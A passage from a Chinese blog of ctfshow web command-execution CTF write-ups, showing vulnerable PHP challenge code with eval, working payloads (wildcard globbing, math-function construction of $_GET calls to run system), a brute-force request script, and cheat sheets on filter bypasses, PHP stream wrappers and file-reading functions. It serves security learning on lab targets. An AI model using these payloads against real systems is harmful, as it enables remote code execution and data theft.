class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>hint：通过<code>$?</code>来实现的，<code>$?</code>是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:code=&lt;A;<span class="variable">$&#123;HOME::$?&#125;</span>???<span class="variable">$&#123;HOME::$?&#125;</span>?????<span class="variable">$&#123;RANDOM::$?&#125;</span> ????.???</span><br><span class="line"><span class="comment">#可能存在成功的机会，不断刷新</span></span><br></pre></td></tr></table></figure>

<p>写个脚本跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f3b4f551-dff5-4254-b043-c4a680b9bf36.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;code&quot;</span>:<span class="string">&quot;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    reponse = requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9&quot;</span> <span class="keyword">in</span> reponse.text:</span><br><span class="line">        <span class="built_in">print</span>(reponse.text)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路就是拿白名单里的数学函数构造出想要的代码(例如system(‘xxx’))，并且长度小于80，目标构造<code>$_GET[a]($_GET[b])</code>，a传入system，b传入命令参数，方括号被过滤，可用大括号，<code>$_GET&#123;a&#125;($_GET&#123;b&#125;)</code>，</p>
<p>高于十进制的数用字母a-z表示，36进制字符集为数字+小写字母，这样就可以构造数字+字母，</p>
<p>但下划线不能直接构造，<code>hex2bin()</code>可将16进制转换为字符串，白名单没有，就先构造出它，再用它进行字符串转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36) ——&gt; hex2bin</span><br><span class="line">dechex(1598506324) ——&gt; _GET的16进制</span><br><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324)) ——&gt; $pi&#x3D;_GET</span><br><span class="line">$$pi ——&gt; $_GET</span><br><span class="line">$$pi&#123;sin&#125;($$pi&#123;cos&#125;) ——&gt; $_GET&#123;sin&#125;($_GET&#123;cos&#125;)</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;sin&#125;($$pi&#123;cos&#125;)&amp;sin&#x3D;system&amp;cos&#x3D;tac flag.php</span><br></pre></td></tr></table></figure>

<h2 id="118-124总结"><a href="#118-124总结" class="headerlink" title="118-124总结"></a>118-124总结</h2><blockquote>
<p><strong>截取系统变量的字符进行拼接构造</strong></p>
<!--web118、119、120、121、122-->

<p><strong>通配符的利用</strong></p>
<p>*代表任意字符（0个或多个）</p>
<p>? 匹配任何一个字符</p>
<p><strong>利用数学函数的构造shell</strong></p>
<!--web124-->
</blockquote>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><p>1.linux知识：通配符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*代表任意字符（0个或多个） </span><br><span class="line">? 匹配任何一个字符（不在括号内时）</span><br><span class="line">[abcd] 匹配abcd中任何一个字符</span><br><span class="line">[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</span><br><span class="line">对于linux cat和ca’&#39;t ca\t ca&quot;&quot;t效果是相同的 这样同样可以绕过字符的限制</span><br></pre></td></tr></table></figure>

<p>2.同system的命令执行函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</span><br><span class="line">exec ： 执行一个外部程序,回显最后一行,需要用echo输出。</span><br><span class="line">shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</span><br><span class="line">proc_open ： 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</span><br><span class="line">passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image&#x2F;gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</span><br><span class="line">pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。 </span><br><span class="line">&#96;（反引号）：同 shell_exec() </span><br></pre></td></tr></table></figure>

<p>3.空格绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125; 但不能写作 $IFS</span><br><span class="line"></span><br><span class="line">$IFS$9</span><br><span class="line">%09</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;</span><br><span class="line">$IFS%09</span><br></pre></td></tr></table></figure>

<p>4.同cat用法的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev</span><br><span class="line">curl file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure>

<p>5.伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">总：</span><br><span class="line">file:&#x2F;&#x2F; 协议</span><br><span class="line">php:&#x2F;&#x2F; 协议</span><br><span class="line">zip:&#x2F;&#x2F; bzip2:&#x2F;&#x2F; zlib:&#x2F;&#x2F; 协议</span><br><span class="line">data:&#x2F;&#x2F; 协议</span><br><span class="line">http:&#x2F;&#x2F; 协议 https:&#x2F;&#x2F;协议</span><br><span class="line">phar:&#x2F;&#x2F; 协议</span><br><span class="line"></span><br><span class="line">分：</span><br><span class="line">file:&#x2F;&#x2F; 协议：</span><br><span class="line">		条件 allow_url_fopen:off&#x2F;on  allow_url_include :off&#x2F;on</span><br><span class="line">		作用：用于访问本地文件系统。在include()&#x2F;require()等参数可控的情况下，如果导入非php文件也会被解析为php</span><br><span class="line">		用法：1.file:&#x2F;&#x2F;[文件的绝对路径和文件名]</span><br><span class="line">	 		2.[文件的相对路径和文件名]</span><br><span class="line">	 		3.[http：&#x2F;&#x2F;网络路径和文件名]</span><br><span class="line"></span><br><span class="line">php:&#x2F;&#x2F; 协议：条件 allow_url_include :仅php:&#x2F;&#x2F;input php:&#x2F;&#x2F;stdin php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp 需要on allow_url_fopen:off&#x2F;on</span><br><span class="line">		作用：php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码</span><br><span class="line">		php:&#x2F;&#x2F;filter参数详解：resource&#x3D;（必选，指定了你要筛选过滤的数据流）     read&#x3D;（可选）    write&#x3D;（可选）</span><br><span class="line">		对read和write，可选过滤器有string.rot13、string.toupper、string.tolower、string.strip_tags、convert.base64-encode &amp; convert.base64-decode</span><br><span class="line">         用法举例：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">zip:&#x2F;&#x2F; bzip2:&#x2F;&#x2F; zlib:&#x2F;&#x2F; 协议：</span><br><span class="line">        条件：allow_url_fopen:off&#x2F;on      allow_url_include :off&#x2F;on</span><br><span class="line">        作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名</span><br><span class="line">        用法：zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]</span><br><span class="line">        	 compress.bzip2:&#x2F;&#x2F;file.bz2</span><br><span class="line">        	 compress.zlib:&#x2F;&#x2F;file.gz</span><br><span class="line">        其中phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;类似</span><br><span class="line"></span><br><span class="line">data:&#x2F;&#x2F; 协议：</span><br><span class="line">        条件：allow_url_fopen:on    allow_url_include :on</span><br><span class="line">        作用：可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</span><br><span class="line">        用法：data:&#x2F;&#x2F;text&#x2F;plain,            data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br><span class="line">        举例：data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">        	 data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">由此可见，web37这道题可以用data:&#x2F;&#x2F;伪协议来执行代码</span><br></pre></td></tr></table></figure>

<p>6.函数获得目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()：返回所有的HTTP头信息，返回的是数组而eval要求为字符串，所以要用implode()函数将数组转换为字符串</span><br><span class="line"></span><br><span class="line">get_defined_vars()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用var_dump()输出可以看见输出的内容，看见在第几位之后，可以用current()函数来获取其值，详细可以看官方函数。payload：var_dump(current(get_defined_vars()));</span><br><span class="line"></span><br><span class="line">session_id()：session_id()可以用来获取&#x2F;设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。</span><br><span class="line">    如可以在cookie中设置 PHPSESSID&#x3D;706870696e666f28293b，然后用hex2bin()函数，即传入?exp&#x3D;eval(hex2bin(session_id(session_start())));     并设置cookie：PHPSESSID&#x3D;706870696e666f28293b</span><br><span class="line">    session_start 函数是为了开启session</span><br><span class="line">    </span><br><span class="line">配合使用的函数：</span><br><span class="line">	print_r(scandir(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">    var_dump()</span><br><span class="line">	localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">	current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br><span class="line">	each() 返回数组中当前的键&#x2F;值对并将数组指针向前移动一步</span><br><span class="line">	end() 将数组的内部指针指向最后一个单元</span><br><span class="line">	next() 将数组中的内部指针向前移动一位</span><br><span class="line">	prev() 将数组中的内部指针倒回一位</span><br><span class="line">	array_reverse() 以相反的元素顺序返回数组</span><br></pre></td></tr></table></figure>

<p>7.输入输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0   标准输入</span><br><span class="line">1   标准输出</span><br><span class="line">2   错误输出</span><br><span class="line">在类Unix系统中,&#x2F;dev&#x2F;null,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)</span><br><span class="line">区别：</span><br><span class="line">2&gt;&#x2F;dev&#x2F;null   把错误输出到空设备（即丢弃）</span><br><span class="line"></span><br><span class="line">&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1   相当于1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备</span><br><span class="line">&gt;2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃</span><br><span class="line"></span><br><span class="line">重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.</span><br></pre></td></tr></table></figure>

<p>8.$(())整数运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">echo $(()) &#x3D; 0</span><br><span class="line">对其取反</span><br><span class="line">echo $((~$(()))) &#x3D; -1</span><br><span class="line">取反加起来</span><br><span class="line">echo $(($((~$(())))$((~$(()))))) &#x3D; -2</span><br><span class="line">对上面的取反</span><br><span class="line">echo $((~$(($((~$(())))$((~$(()))))))) &#x3D; 1</span><br><span class="line"></span><br><span class="line">百度之后，发现$(())是用来作整数运算</span><br><span class="line">如a&#x3D;5 b&#x3D;7 c&#x3D;2</span><br><span class="line">echo $((a+b*c)) &#x3D; 19</span><br><span class="line">$(())能进行的运算有</span><br><span class="line"></span><br><span class="line">+ - * &#x2F; 加、减、乘、除</span><br><span class="line"></span><br><span class="line">% 余数运算</span><br><span class="line"></span><br><span class="line">&amp; | ^ ! AND、OR、XOR、NOT运算</span><br></pre></td></tr></table></figure>

<p>9.读取文件的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line">show_source($filename);</span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line">print_r(file($filename)); &#x2F;&#x2F; var_dump</span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line">include($filename); &#x2F;&#x2F; 非php代码</span><br><span class="line">include_once($filename); &#x2F;&#x2F; 非php代码</span><br><span class="line">require($filename); &#x2F;&#x2F; 非php代码</span><br><span class="line">require_once($filename); &#x2F;&#x2F; 非php代码</span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行</span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF</span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line">print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>

<p>10.读取目录的函数2.0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(&quot;*&quot;)); &#x2F;&#x2F; 列当前目录</span><br><span class="line">print_r(glob(&quot;&#x2F;*&quot;)); &#x2F;&#x2F; 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">$d&#x3D;opendir(&quot;.&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d&#x3D;dir(&quot;.&quot;);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a&#x3D;glob(&quot;&#x2F;*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://BkingXD.github.io">BkingXD</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bkingxd.github.io/2021/10/12/ctfshow%20WEB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://bkingxd.github.io/2021/10/12/ctfshow%20WEB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/25/2021%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/"><img class="prev-cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">2021浙江省赛初赛题目pppop复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/11/BUUCTF%20Web3/"><img class="next-cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">BUUCTF Web3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/07/25/ctfshow%20WEB%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="ctfshow信息搜集"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-25</div><div class="title">ctfshow信息搜集</div></div></a></div><div><a href="/2021/08/12/ctfshow%20WEB%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow文件包含"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-12</div><div class="title">ctfshow文件包含</div></div></a></div><div><a href="/2021/11/17/ctfshow%20WEBSSRF/" title="ctfshow SSRF"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-17</div><div class="title">ctfshow SSRF</div></div></a></div><div><a href="/2022/03/02/ctfshow%20WEBSSTI/" title="ctfshow SSTI"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-02</div><div class="title">ctfshow SSTI</div></div></a></div><div><a href="/2022/01/11/ctfshow%20WEBXSS/" title="ctfshow xss"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div 